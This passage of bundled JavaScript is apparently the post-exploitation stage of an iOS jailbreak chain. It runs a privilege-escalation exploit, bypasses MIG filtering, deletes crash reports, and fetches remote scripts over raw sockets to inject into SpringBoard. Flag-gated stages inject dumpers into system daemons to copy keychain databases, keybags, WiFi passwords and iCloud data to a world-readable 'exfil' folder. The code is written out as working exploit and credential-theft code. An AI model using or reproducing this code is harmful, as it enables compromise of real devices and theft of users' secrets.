		//Native.write64(threadMem, lock.kernelSlide);
		//Native.write64(threadMem + 0x8n, lock.lockAddr);
		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);

		for (let i=0; i<10; i++) {
			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
			if (isRunning)
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
		}

		this.#running = true;
	}

	stop() {
		if (!this.#running)
			return;

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 0);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	resume() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread1Ptr, thread1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
	const release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";
const ENABLE_CORUNA_TWEAKLOADER = false;
const ENABLE_SPRINGBOARD_JS_TWEAK = true;
const SPRINGBOARD_JS_TWEAK_PATH = "/lightsaber/fiveicondock_light.js";
const SPRINGBOARD_JS_TWEAK_LABEL = "FiveIconDock JS";
const ENABLE_UNRELATED_DUMPS = false;
const ENABLE_KEYCHAIN_DUMP = false;
const ENABLE_WIFI_DUMP = false;
const ENABLE_ICLOUD_DUMP = false;
const ENABLE_DUMP_COPYOUT = false;

function fetchRemoteScript(path) {
	try {
		if (typeof XMLHttpRequest !== "undefined") {
			let xhr = new XMLHttpRequest();
			xhr.open("GET", "https://zeroxjf.github.io/lightsaber" + path + "?" + Date.now(), false);
			xhr.send(null);
			if (xhr.status !== 200 || !xhr.responseText) {
				LOG("[PE] Failed fetching " + path + " status=" + xhr.status);
				return null;
			}
			LOG("[PE] Fetched " + path + " bytes=" + xhr.responseText.length + " via XHR");
			return xhr.responseText;
		}

		LOG("[PE] XMLHttpRequest unavailable, falling back to native socket fetch for " + path);
		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
		const SERVER_IP = "185.199.108.153";
		const SERVER_PORT = 443;
		const AF_INET = 2;
		const SOCK_STREAM = 1;

		let sock = Native.callSymbol("socket", AF_INET, SOCK_STREAM, 0);
		if (Number(sock) < 0) {
			LOG("[PE] socket fetch failed: socket()=" + sock);
			return null;
		}

		let sockaddr = Native.callSymbol("malloc", 16n);
		let addrBuf = new ArrayBuffer(16);
		let addrView = new DataView(addrBuf);
		addrView.setUint8(0, 16);
		addrView.setUint8(1, AF_INET);
		addrView.setUint16(2, SERVER_PORT, false);
		addrView.setUint8(4, 185);
		addrView.setUint8(5, 199);
		addrView.setUint8(6, 108);
		addrView.setUint8(7, 153);
		Native.write(sockaddr, addrBuf);

		let conn = Native.callSymbol("connect", sock, sockaddr, 16);
		Native.callSymbol("free", sockaddr);
		if (Number(conn) < 0) {
			LOG("[PE] socket fetch connect failed: " + conn);
			Native.callSymbol("close", sock);
			return null;
		}

		let httpReq = "GET " + path + " HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n";
		let reqBuf = Native.callSymbol("malloc", BigInt(httpReq.length + 1));
		Native.writeString(reqBuf, httpReq);
		let sent = Native.callSymbol("write", sock, reqBuf, httpReq.length);
		Native.callSymbol("free", reqBuf);
		if (Number(sent) <= 0) {
			LOG("[PE] socket fetch write failed: " + sent);
			Native.callSymbol("close", sock);
			return null;
		}

		let respSize = 2 * 1024 * 1024;
		let respBuf = Native.callSymbol("malloc", BigInt(respSize));
		let totalRead = 0;
		while (totalRead < respSize - 1) {
			let r = Native.callSymbol("read", sock, respBuf + BigInt(totalRead), respSize - totalRead - 1);
			if (Number(r) <= 0) break;
			totalRead += Number(r);
		}
		Native.callSymbol("close", sock);
		if (totalRead <= 0) {
			Native.callSymbol("free", respBuf);
			LOG("[PE] socket fetch empty response");
			return null;
		}

		let respData = Native.read(respBuf, totalRead);
		Native.callSymbol("free", respBuf);
		let resp8 = new Uint8Array(respData);
		let bodyStart = -1;
		for (let i = 0; i < totalRead - 3; i++) {
			if (resp8[i] === 0x0d && resp8[i + 1] === 0x0a && resp8[i + 2] === 0x0d && resp8[i + 3] === 0x0a) {
				bodyStart = i + 4;
				break;
			}
		}
		if (bodyStart < 0) {
			LOG("[PE] socket fetch could not find HTTP body");
			return null;
		}

		let bodyLen = totalRead - bodyStart;
		if (bodyLen <= 0) {
			LOG("[PE] socket fetch body empty");
			return null;
		}

		let textBytes = resp8.slice(bodyStart, totalRead);
		let script = "";
		for (let i = 0; i < textBytes.length; i++) script += String.fromCharCode(textBytes[i]);
		LOG("[PE] Fetched " + path + " bytes=" + script.length + " via native socket");
		return script;
	} catch (e) {
		LOG("[PE] fetchRemoteScript error for " + path + ": " + String(e));
		return null;
	}
}

function injectCorunaTweakloader(existingTask, migFilterBypass, agentPid) {
	LOG("[PE] Injecting Coruna tweakloader into SpringBoard...");
	const code = fetchRemoteScript("/coruna_tweakloader.js");
	if (!code) {
		LOG("[PE] Coruna tweakloader fetch failed");
		return false;
	}
	try {
		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
		let ok = loader.inject(agentPid);
		LOG("[PE] Coruna tweakloader inject result: " + ok);
		return ok;
	} catch (e) {
		LOG("[PE] Coruna tweakloader inject exception: " + String(e));
		return false;
	}
}

function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agentPid, path, label) {
	LOG("[PE] Injecting " + label + " into SpringBoard...");
	let code = (typeof globalThis.__fiveicondock_code === 'string' && globalThis.__fiveicondock_code.length > 0) ? globalThis.__fiveicondock_code : fetchRemoteScript(path);
	if (!code) {
		LOG("[PE] " + label + " fetch failed");
		return false;
	}
	LOG("[PE] " + label + " code ready, bytes=" + code.length);
	try {
		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
		let ok = loader.inject(agentPid);
		LOG("[PE] " + label + " inject result: " + ok);
		return ok;
	} catch (e) {
		LOG("[PE] " + label + " inject exception: " + String(e));
		return false;
	}
}

function runOptionalStage(label, enabled, fn) {
	if (!enabled) {
		LOG("[PE] " + label + " disabled");
		return false;
	}
	try {
		return !!fn();
	} catch (e) {
		LOG("[PE] " + label + " exception: " + String(e));
		return false;
	}
}

function start() { LOG("[+] PE start() called");
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {

		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
		LOG("[PE] Creating MigFilterBypass..."); migFilterBypass = new MigFilterBypass(mutexPtr); LOG("[PE] MigFilterBypass created");
	}
	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();

	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);

	LOG("[PE] Running PE chain..."); let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE(); LOG("[PE] PE chain result: " + resultPE);
	if (!resultPE)
		return;


	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
	if(migFilterBypass)
		migFilterBypass.start();
	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
	if (!launchdTask.success()) {
		return false;
	}

	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();

	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
	let filzaDst = "/private/var/mobile/Media/Downloads/";
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
	LOG("[PE] Exfil dir: " + filzaDst);

	LOG("[PE] Creating agent loader for " + targetProcess); let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
	let agentPid = 0;

		if (agentLoader.inject()) { LOG("[+] Agent loader injected");
			agentPid = agentLoader.task.pid();
			if (ENABLE_CORUNA_TWEAKLOADER)
				injectCorunaTweakloader(agentLoader.task, migFilterBypass, agentPid);
			else
				LOG("[PE] Coruna tweakloader disabled");
			if (ENABLE_SPRINGBOARD_JS_TWEAK)
				injectLightweightSpringBoardPayload(agentLoader.task, migFilterBypass, agentPid, SPRINGBOARD_JS_TWEAK_PATH, SPRINGBOARD_JS_TWEAK_LABEL);
			else
				LOG("[PE] SpringBoard JS tweak disabled");

			agentLoader.destroy();
		}

	runOptionalStage("Unrelated dumps master switch", ENABLE_UNRELATED_DUMPS, () => true);

	runOptionalStage("Keychain dump stage", ENABLE_UNRELATED_DUMPS && ENABLE_KEYCHAIN_DUMP, () => {
		// Inject keychain copier FIRST into securityd (has access to keychain files)
		// This copies keychain/keybag to /tmp with 777 permissions
		const keychainProcess = "configd";
		LOG("[PE] Creating keychain copier for " + keychainProcess);
		let keychainCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](keychainProcess, _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"], migFilterBypass);
		if (keychainCopier.inject()) {
			LOG("[+] Keychain copier injected");
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
			keychainCopier.destroy();
			return true;
		}
		LOG("[-] Keychain copier injection FAILED for " + keychainProcess);
		return false;
	});

	runOptionalStage("WiFi dump stage", ENABLE_UNRELATED_DUMPS && ENABLE_WIFI_DUMP, () => {
		// Inject WiFi password dump into wifid (has keychain access for WiFi)
		// Using wifid instead of wifianalyticsd - wifid is always active
		const wifidProcess = "wifid";
		LOG("[PE] Creating WiFi dump for " + wifidProcess);
		let wifiDump = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](wifidProcess, _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"], migFilterBypass);
		if (wifiDump.inject()) {
			LOG("[+] WiFi dump injected into wifid");
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
			wifiDump.destroy();
		} else {
			LOG("[-] WiFi dump injection FAILED for wifid");
		}

		// Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
		const securitydProcess = "securityd";
		LOG("[PE] Creating WiFi dump for " + securitydProcess);
		let wifiDumpSecurityd = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](securitydProcess, _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"], migFilterBypass);
		if (wifiDumpSecurityd.inject()) {
			LOG("[+] WiFi dump injected into securityd");
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
			wifiDumpSecurityd.destroy();
		} else {
			LOG("[-] WiFi dump injection FAILED for securityd");
		}
		return true;
	});

	runOptionalStage("iCloud dump stage", ENABLE_UNRELATED_DUMPS && ENABLE_ICLOUD_DUMP, () => {
		// Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
		const userEventAgentProcess = "UserEventAgent";
		LOG("[PE] Creating iCloud dump for " + userEventAgentProcess);
		let iCloudDumper = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](userEventAgentProcess, _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"], migFilterBypass);
		if (iCloudDumper.inject()) {
			LOG("[+] iCloud dump injected into UserEventAgent");
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
			iCloudDumper.destroy();
			return true;
		}
		LOG("[-] iCloud dump injection FAILED for UserEventAgent");
		return false;
	});

	runOptionalStage("Dump copyout stage", ENABLE_UNRELATED_DUMPS && ENABLE_DUMP_COPYOUT, () => {
		// Wait for all dumps to finish
		LOG("[PE] Waiting 5 seconds for dumps to complete...");
		for (let i = 1; i <= 5; i++) {
			LOG("[PE] Sleep " + i + "/5...");
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		}
		LOG("[PE] Done waiting, copying dumps to /private/var/mobile/Media/Downloads/...");

		// Get sandbox token for destination path
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/mobile/Media/Downloads/", true);
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/var/mobile/Media/Downloads/", true);
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].getTokenForPath("/private/var/mobile/Media/", true);
		LOG("[PE] Sandbox tokens consumed for Downloads");

		// Copy payload outputs from /tmp into /private/var/mobile/Media/Downloads/
		{
		// iOS 18.6 paths - only files that actually exist
		let dumpFiles = [
			"keychain-2.db",
			"persona.kb", "usersession.kb",
			"persona_private.kb", "usersession_private.kb",
			"MobileGestalt.plist"
		];
		let copied = 0;
		let failed = 0;
		let notFound = 0;
		let COPYFILE_ALL = 0x1fn;

		// Verify dest dir exists
		let mkdirRet = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", filzaDst, 0o777n);
		LOG("[PE] mkdir " + filzaDst + " ret=" + mkdirRet);

		// Check if dest dir was created
		let dirCheck = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("access", filzaDst, 0n);
		LOG("[PE] access " + filzaDst + " ret=" + dirCheck);

		// Allocate stat buffer
		let statBuf = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 256n);

		for (let f of dumpFiles) {
			let src = "/tmp/" + f;
			let dst = filzaDst + f;
			let fd = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("open", src, 0n);
			if (Number(fd) >= 0) {
				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("close", fd);
				let cpRet = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("copyfile", src, dst, 0n, COPYFILE_ALL);
				// Stat the destination to verify it exists and get size
				let statRet = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("stat", dst, statBuf);
				if (Number(statRet) === 0) {
					let statData = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(BigInt(statBuf), 144);
					let view = new DataView(statData);
					let fileSize = Number(view.getBigUint64(96, true));
					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", dst, 0o777n);
					copied++;
					LOG("[PE] OK: " + dst + " (" + fileSize + " bytes)");
				} else {
					failed++;
					let err = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("__error");
					let errno = err ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(BigInt(err)) : -1;
					LOG("[PE] FAIL " + dst + " cpRet=" + cpRet + " statRet=" + statRet + " errno=" + errno);
				}
			} else {
				notFound++;
			}
		}
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("free", statBuf);
		LOG("[PE] /tmp files: " + copied + " copied, " + failed + " failed, " + notFound + " not found");

		// Also copy icloud_dump directory contents
		let icloudSrc = "/tmp/icloud_dump";
		let icloudDst = filzaDst + "icloud_dump/";
		let icloudMkdir = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", icloudDst, 0o755n);
		LOG("[PE] mkdir " + icloudDst + " ret=" + icloudMkdir);

		let idir = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("opendir", icloudSrc);
		LOG("[PE] opendir " + icloudSrc + " ret=" + idir);
		let icloudCopied = 0;
		let icloudFailed = 0;
		if (idir) {
			while (true) {
				let ie = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("readdir", idir);
				if (!ie) break;
				// Read dirent header to get name length safely
				let direntData = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(BigInt(ie), 24);
				if (!direntData) break;
				let view = new DataView(direntData);
				let d_namlen = view.getUint16(18, true);
				if (d_namlen === 0 || d_namlen > 255) continue;
				let iname = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(BigInt(ie) + 21n, d_namlen + 1);
				if (!iname || iname === "." || iname === "..") continue;
				let s = icloudSrc + "/" + iname;
				let d = icloudDst + iname;
				let cpRet = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("copyfile", s, d, 0n, COPYFILE_ALL);
				if (Number(cpRet) === 0) {
					libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", d, 0o644n);
					icloudCopied++;
				} else {
					icloudFailed++;
					LOG("[PE] FAIL icloud " + iname + " ret=" + cpRet);
				}
			}
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("closedir", idir);
		}
		LOG("[PE] icloud_dump: " + icloudCopied + " copied, " + icloudFailed + " failed");
		LOG("[PE] Total: " + (copied + icloudCopied) + " files to " + filzaDst);
		}
		return true;
	});
	// ========== MobileGestalt Patcher (Server Fetch) ==========
	const ENABLE_MG_PATCH = false;
	LOG("[MG] ENABLE_MG_PATCH = " + ENABLE_MG_PATCH);
	if (ENABLE_MG_PATCH) {
		LOG("[MG] === MG PATCHER ENTRY ===");
		try {
			LOG("[MG] Starting MobileGestalt fetch from server...");
			const MGNative = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
			LOG("[MG] Got MGNative ref");
			const GESTALT_PATH = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist";
			const SERVER_IP = "185.199.108.153";
			const SERVER_PORT = 443;
			const PLIST_URL = "/lightsaber/MobileGestalt_iPad_CORRECT.plist";
			LOG("[MG] Config: " + SERVER_IP + ":" + SERVER_PORT + PLIST_URL);

			// Create socket
			LOG("[MG] Creating socket...");
			const AF_INET = 2, SOCK_STREAM = 1;
			let sock = MGNative.callSymbol("socket", AF_INET, SOCK_STREAM, 0);
			LOG("[MG] socket() = " + sock);
			if (Number(sock) < 0) throw "socket failed";

			// Build sockaddr_in
			LOG("[MG] Building sockaddr...");
			let sockaddr = MGNative.callSymbol("malloc", 16n);
			LOG("[MG] sockaddr malloc = " + sockaddr);
			let addrBuf = new ArrayBuffer(16);
			let addrView = new DataView(addrBuf);
			addrView.setUint8(0, 16);
			addrView.setUint8(1, AF_INET);
			addrView.setUint16(2, SERVER_PORT, false);
			addrView.setUint8(4, 185);
			addrView.setUint8(5, 199);
			addrView.setUint8(6, 108);
			addrView.setUint8(7, 153);
			MGNative.write(sockaddr, addrBuf);
			LOG("[MG] sockaddr written");

			LOG("[MG] Connecting...");
			let conn = MGNative.callSymbol("connect", sock, sockaddr, 16);
			LOG("[MG] connect() = " + conn);
			MGNative.callSymbol("free", sockaddr);
			if (Number(conn) < 0) { MGNative.callSymbol("close", sock); throw "connect failed errno=" + conn; }

			// Send HTTP GET
			LOG("[MG] Sending HTTP request...");
			let httpReq = "GET " + PLIST_URL + " HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n";
			let reqBuf = MGNative.callSymbol("malloc", BigInt(httpReq.length + 1));
			MGNative.writeString(reqBuf, httpReq);
			let sent = MGNative.callSymbol("write", sock, reqBuf, httpReq.length);
			MGNative.callSymbol("free", reqBuf);
			LOG("[MG] Sent " + sent + "/" + httpReq.length + " bytes");

			// Read response
			LOG("[MG] Reading response...");
			let respSize = 32768;
			let respBuf = MGNative.callSymbol("malloc", BigInt(respSize));
			LOG("[MG] respBuf malloc = " + respBuf);
			let totalRead = 0;
			while (totalRead < respSize - 1) {
				let r = MGNative.callSymbol("read", sock, respBuf + BigInt(totalRead), respSize - totalRead - 1);
				LOG("[MG] read() = " + r);
				if (Number(r) <= 0) break;
				totalRead += Number(r);
			}
			MGNative.callSymbol("close", sock);
			LOG("[MG] Total received: " + totalRead + " bytes");

			// Find body
			LOG("[MG] Parsing HTTP response...");
			let respData = MGNative.read(respBuf, totalRead);
			let resp8 = new Uint8Array(respData);
			let bodyStart = -1;
			for (let i = 0; i < totalRead - 3; i++) {
				if (resp8[i] === 0x0d && resp8[i+1] === 0x0a && resp8[i+2] === 0x0d && resp8[i+3] === 0x0a) {
					bodyStart = i + 4;
					break;
				}
			}
			MGNative.callSymbol("free", respBuf);
			LOG("[MG] bodyStart = " + bodyStart);

			if (bodyStart < 0) throw "no HTTP body found";
			let bodyLen = totalRead - bodyStart;
			LOG("[MG] bodyLen = " + bodyLen);

			// Write body to file
			LOG("[MG] Writing to " + GESTALT_PATH);
			let bodyBuf = MGNative.callSymbol("malloc", BigInt(bodyLen + 16));
			let bodyData = new Uint8Array(bodyLen);
			for (let i = 0; i < bodyLen; i++) bodyData[i] = resp8[bodyStart + i];
			MGNative.write(bodyBuf, bodyData.buffer);

			let fd = MGNative.callSymbol("open", GESTALT_PATH, 0x601, 0o644);
			LOG("[MG] open() fd = " + fd);
			if (!fd || Number(fd) < 0) {
				MGNative.callSymbol("free", bodyBuf);
				throw "cannot open for write fd=" + fd;
			}
			let written = MGNative.callSymbol("write", fd, bodyBuf, bodyLen);
			LOG("[MG] write() = " + written);
			MGNative.callSymbol("close", fd);
			MGNative.callSymbol("free", bodyBuf);
			LOG("[MG] SUCCESS: Wrote " + written + "/" + bodyLen + " bytes");

		} catch (mgErr) {
			LOG("[MG] ERROR: " + String(mgErr));
		}
		LOG("[MG] === MG PATCHER EXIT ===");
	} else {
		LOG("[MG] MobileGestalt patcher disabled");
	}
	LOG("[PE] Cleaning up launchdTask..."); launchdTask.destroy(); LOG("[PE] start() completed successfully");

	return true;
}

try {
	start();
}
catch (error) {
	LOG("[!] Error: " + (typeof injectError !== "undefined" ? injectError : error));
}
finally {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
}

})();

/******/ })()
;
  } catch (error) {
	  LOG(`Main function resulted with an error: ${error}`);
	  LOG("stack: " + error.stack);
  } finally {
	  // Post-Exp done.
	  // Exiting the process.
	  exit(0n);
  }
})();
